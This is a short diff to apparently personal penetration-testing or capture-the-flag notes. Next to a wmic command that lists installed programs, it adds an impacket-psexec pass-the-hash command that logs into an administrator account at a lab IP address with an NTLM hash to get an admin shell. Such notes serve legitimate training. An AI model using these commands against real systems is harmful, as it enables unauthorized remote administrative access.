@@ -38,3 +38,9 @@ list installed programms
 ```
 wmic product get name,version,vendor
 ```
+
+#*└─#* (get admin shell)
+```
+impacket-psexec -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.129.95.210
+
+```
